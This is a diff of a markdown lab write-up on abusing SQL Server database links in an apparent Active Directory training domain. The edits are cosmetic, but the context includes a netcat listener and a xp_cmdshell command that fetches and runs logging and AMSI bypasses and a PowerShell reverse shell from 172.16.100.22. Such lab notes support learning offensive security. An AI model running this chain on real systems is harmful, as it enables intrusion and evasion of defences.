@@ -1,4 +1,4 @@
-# Learning Objective 22 (Domain Privilege Escalation | MSSQL Database Links Abuse)
+# Learning Objective 22 (Cross Trust Attacks | SQL Server Links Abuse)
 
 ## Tasks
 
@@ -34,14 +34,14 @@ We can use PowerUpSQL module for that.
 [SNIP]
 ```
 
-`Import-Module C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1`
+`Import-Module C:\AD\Tools\PowerUpSQL-master\PowerUpSQL.psd1`
 
 `Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose`:
 ```
 VERBOSE: dcorp-mgmt.dollarcorp.moneycorp.local,1433 : Connection Failed.
 VERBOSE: dcorp-mgmt.dollarcorp.moneycorp.local : Connection Failed.
-VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local,1433 : Connection Success.
-VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.
+VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local,1433 : Connection Success.📌
+VERBOSE: dcorp-mssql.dollarcorp.moneycorp.local : Connection Success.📌
 VERBOSE: dcorp-sql1.dollarcorp.moneycorp.local,1433 : Connection Failed.
 VERBOSE: dcorp-sql1.dollarcorp.moneycorp.local : Connection Failed.
 
@@ -248,7 +248,7 @@ listening on [any] 443 ...
 
 Let's try to execute a PowerShell download execute cradle to execute a PowerShell reverse shell on the `eu-sql26` instance.
 
-![HFS](./assets/screenshots/learning_objective_22_hfs.png)
+![HFS - Scripts](./assets/screenshots/learning_objective_22_hfs_scripts.png)
 
 `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.22/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.22/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.22/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sql26`
 
